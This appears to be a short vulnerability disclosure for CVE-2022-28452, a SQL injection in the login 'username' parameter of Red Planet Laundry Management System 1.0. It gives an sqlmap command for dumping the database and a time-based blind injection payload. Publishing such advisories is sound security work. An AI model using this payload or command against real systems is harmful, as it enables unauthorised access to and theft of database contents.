# Red-Planet-Laundry-Management-System-1.0-is-vulnerable-to-SQL       

https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-28452
https://nvd.nist.gov/view/vuln/detail?vulnId=CVE-2022-28452
https://laundry.redplanetcomputers.com/

1-Description:

Red Planet Laundry Management System 1.0 is vulnerable to SQL Injection via parameter 'username' in /index.php/login/rediract . Exploiting this issue could allow an attacker to compromise the application, access or modify data, or exploit latent vulnerabilities in the underlying database.

2-Proof of Concept:

In Burpsuite intercept the request from the affected page with 'username' parameter and save it like poc.txt Then run SQLmap to extract the data from the database:
sqlmap.py -r poc.txt --dbms=mysql

3-Example payload:

URL encoded POST input username was set to 0'XOR(if(now()=sysdate(),sleep(4),0))XOR'Z












Contact details:   alexsahbaz@gmail.com
